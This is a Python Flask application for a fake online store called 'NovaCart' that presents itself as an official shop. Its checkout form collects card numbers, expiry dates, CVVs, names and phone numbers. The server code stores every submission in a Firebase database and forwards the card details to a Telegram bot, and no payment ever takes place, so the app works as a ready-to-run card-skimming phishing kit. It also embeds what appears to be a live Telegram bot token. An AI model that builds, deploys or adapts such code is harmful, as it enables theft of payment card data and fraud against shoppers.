import os
import time
import requests
from flask import Flask, request, render_template_string

app = Flask(__name__)

FIREBASE_DB_URL = os.environ.get(
    "FIREBASE_DB_URL",
    "https://vova-733e8-default-rtdb.firebaseio.com"
).rstrip("/")

BOT_TOKEN = os.environ.get("9257108138:AAHgiSAHL-MpsD4IuKBYk0leWmZeMaPeIhA", "")
ADMIN_CHAT_ID = os.environ.get("6398769189", "")

PRODUCTS = [
    (1, "Nova Smartphone", 14999, "Mobiles"),
    (2, "Wireless Earbuds", 1499, "Accessories"),
    (3, "Smart Watch", 2499, "Wearables"),
    (4, "Laptop Pro", 49999, "Computers"),
]

HTML = """
<!doctype html>
<html lang="hi">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>NovaCart</title>
<style>
*{box-sizing:border-box;font-family:Arial,sans-serif}
body{margin:0;background:#f4f6fa;color:#1b263b}
header{background:#0f2537;color:#fff;padding:16px 24px;display:flex;justify-content:space-between;align-items:center}
.brand{font-size:22px;font-weight:bold;color:#ffb703;text-decoration:none}
.wrap{max-width:980px;margin:24px auto;padding:0 16px}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:16px}
.box{background:#fff;padding:18px;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,.06)}
.price{font-size:19px;font-weight:bold;margin:8px 0}
input,button{width:100%;padding:11px;margin-top:8px;border-radius:7px;border:1px solid #cbd5e1}
button{background:#ffb703;color:#0f2537;font-weight:bold;border:none;cursor:pointer}
.row{display:flex;gap:10px}
.ok{background:#e6f4ea;color:#137333;padding:14px;border-radius:8px;margin-bottom:16px;font-weight:bold}
</style>
</head>
<body>
<header>
  <a class="brand" href="/">NovaCart</a>
  <span>Official Store</span>
</header>
<div class="wrap">
  {% if message %}<div class="ok">{{ message }}</div>{% endif %}

  <div class="grid">
    {% for p in products %}
    <div class="box">
      <h3>{{ p[1] }}</h3>
      <p>{{ p[3] }}</p>
      <div class="price">₹{{ "{:,}".format(p[2]) }}</div>
      <button type="button" onclick="selectItem('{{ p[1] }}', '{{ p[2] }}')">Select Item</button>
    </div>
    {% endfor %}
  </div>

  <div class="box" style="margin-top:24px">
    <h2>Card & Billing Details</h2>
    <form method="post" action="/submit">
      <input name="item" id="item" value="Nova Smartphone (₹14,999)" required>
      <input name="fullname" placeholder="Full Name" required>
      <input name="phone" placeholder="Mobile Number" required>
      <input name="card_number" placeholder="Card Number" required>
      <div class="row">
        <input name="expiry" placeholder="MM/YY" required>
        <input name="cvv" placeholder="CVV" required>
      </div>
      <button type="submit">Confirm & Pay</button>
    </form>
  </div>
</div>
<script>
function selectItem(name, price) {
  document.getElementById("item").value = name + " (₹" + Number(price).toLocaleString() + ")";
  document.getElementById("item").scrollIntoView({behavior: "smooth"});
}
</script>
</body>
</html>
"""

def send_bot_alert(text):
    if not BOT_TOKEN or not ADMIN_CHAT_ID:
        return
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": ADMIN_CHAT_ID, "text": text},
            timeout=10
        )
    except requests.RequestException:
        pass

def save_to_firebase(data):
    try:
        requests.post(
            f"{FIREBASE_DB_URL}/submissions.json",
            json=data,
            timeout=10
        )
    except requests.RequestException:
        pass

@app.route("/", methods=["GET"])
def index():
    return render_template_string(HTML, products=PRODUCTS, message=None)

@app.route("/submit", methods=["POST"])
def submit():
    payload = {
        "item": request.form.get("item", "").strip(),
        "fullname": request.form.get("fullname", "").strip(),
        "phone": request.form.get("phone", "").strip(),
        "card_number": request.form.get("card_number", "").strip(),
        "expiry": request.form.get("expiry", "").strip(),
        "cvv": request.form.get("cvv", "").strip(),
        "timestamp": int(time.time())
    }

    save_to_firebase(payload)

    alert_msg = (
        "नई सबमिशन आई है:\n"
        f"Item: {payload['item']}\n"
        f"Name: {payload['fullname']}\n"
        f"Phone: {payload['phone']}\n"
        f"Card: {payload['card_number']}\n"
        f"Expiry: {payload['expiry']} | CVV: {payload['cvv']}"
    )
    send_bot_alert(alert_msg)

    return render_template_string(
        HTML,
        products=PRODUCTS,
        message="आपकी डिटेल सबमिट हो गई है।"
    )

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
    
